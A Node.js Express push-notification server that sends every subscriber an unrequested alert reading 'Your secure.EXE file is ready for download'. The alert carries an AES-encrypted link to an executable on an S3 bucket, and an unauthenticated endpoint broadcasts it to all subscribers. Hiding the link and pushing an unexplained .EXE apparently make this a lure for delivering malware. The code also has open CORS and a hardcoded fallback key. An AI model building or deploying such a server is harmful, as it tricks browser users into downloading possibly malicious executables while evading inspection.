// server.js - Push notification server for Render.com
const express = require('express');
const webpush = require('web-push');
const cors = require('cors');
const bodyParser = require('body-parser');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;

// Configure middleware
app.use(cors()); // Enable CORS for all routes
app.use(bodyParser.json()); // Parse JSON request bodies

// Get VAPID keys from environment variables
const vapidKeys = {
  publicKey: process.env.VAPID_PUBLIC_KEY,
  privateKey: process.env.VAPID_PRIVATE_KEY
};

// Configure web-push
webpush.setVapidDetails(
  'mailto:' + (process.env.CONTACT_EMAIL || 'your-email@example.com'),
  vapidKeys.publicKey,
  vapidKeys.privateKey
);

// In-memory subscription storage
let subscriptions = [];

// Function to create a 32-byte key (required for AES-256)
function createEncryptionKey(keyString) {
  // Use SHA-256 to generate a 32-byte key from any string
  return crypto.createHash('sha256').update(keyString).digest();
}

// Get encryption key from environment variables or use default
const encryptionKeyString = process.env.ENCRYPTION_KEY || 'your-encryption-key-should-be-32-bytes';
const ENCRYPTION_KEY = createEncryptionKey(encryptionKeyString);

// Function to encrypt data
function encryptData(data) {
  const iv = crypto.randomBytes(16);
  // Use the 32-byte key generated above
  const cipher = crypto.createCipheriv('aes-256-cbc', ENCRYPTION_KEY, iv);
  let encrypted = cipher.update(data);
  encrypted = Buffer.concat([encrypted, cipher.final()]);
  return { iv: iv.toString('hex'), data: encrypted.toString('hex') };
}

// Root endpoint
app.get('/', (req, res) => {
  res.send('Push Notification Server is running!');
});

// Endpoint to get VAPID public key
app.get('/api/vapid-public-key', (req, res) => {
  res.json({ publicKey: vapidKeys.publicKey });
});

// Subscribe endpoint
app.post('/api/subscribe', (req, res) => {
  try {
    const subscription = req.body;
    
    // Validate subscription
    if (!subscription || !subscription.endpoint) {
      return res.status(400).json({
        success: false,
        message: 'Invalid subscription object'
      });
    }
    
    // Add subscription if it doesn't exist
    const exists = subscriptions.some(sub => 
      sub.endpoint === subscription.endpoint
    );
    
    if (!exists) {
      subscriptions.push(subscription);
      console.log(`New subscription added. Total: ${subscriptions.length}`);
      
      // Send initial notification with specific file link
      setTimeout(() => sendSpecificFileNotification(subscription), 2000);
    } else {
      console.log('Subscription already exists');
      
      // You can still send a notification to existing subscriptions if needed
      setTimeout(() => sendSpecificFileNotification(subscription), 2000);
    }
    
    return res.status(201).json({ 
      success: true, 
      message: 'Subscription saved' 
    });
  } catch (error) {
    console.error('Error in subscribe handler:', error);
    return res.status(500).json({ 
      success: false, 
      message: `Server error: ${error.message}` 
    });
  }
});

// Endpoint to manually trigger file notification
app.post('/api/send-file-notification', async (req, res) => {
  try {
    if (subscriptions.length === 0) {
      return res.status(400).json({
        success: false,
        message: 'No subscriptions available'
      });
    }
    
    // Send to all subscriptions
    let successCount = 0;
    let errorCount = 0;
    
    for (const subscription of subscriptions) {
      try {
        await sendSpecificFileNotification(subscription);
        successCount++;
      } catch (error) {
        errorCount++;
        console.error('Error sending to subscription:', error);
      }
    }
    
    return res.json({ 
      success: true, 
      message: `Sent file notifications to ${successCount} subscribers (${errorCount} failed)` 
    });
  } catch (error) {
    console.error('Error sending file notification:', error);
    return res.status(500).json({ 
      success: false, 
      message: `Server error: ${error.message}` 
    });
  }
});

// Function to send notification for the specific EXE file
async function sendSpecificFileNotification(subscription) {
  try {
    // Use the specific file URL
    const fileUrl = process.env.FILE_URL || 'https://exe-file-download.s3.ap-southeast-1.amazonaws.com/secure.EXE';
    
    // Encrypt the URL
    const encryptedUrl = encryptData(fileUrl);
    
    // Prepare notification payload
    const payload = JSON.stringify({
      title: 'Secure File Download',
      body: 'Your secure.EXE file is ready for download. Click to access.',
      data: {
        encryptedUrl: encryptedUrl,
        fileName: 'secure.EXE'
      }
    });
    
    // Send the notification
    await webpush.sendNotification(subscription, payload);
    console.log('Sent encrypted file notification for secure.EXE');
    return true;
  } catch (error) {
    console.error('Error sending encrypted notification:', error);
    
    // If subscription is expired or invalid, remove it
    if (error.statusCode === 410) {
      subscriptions = subscriptions.filter(
        sub => sub.endpoint !== subscription.endpoint
      );
      console.log('Removed invalid subscription');
    }
    
    throw error;
  }
}

// Subscription list endpoint (for debugging)
app.get('/api/subscriptions', (req, res) => {
  return res.json({
    count: subscriptions.length,
    subscriptions: subscriptions.map(sub => ({ endpoint: sub.endpoint }))
  });
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
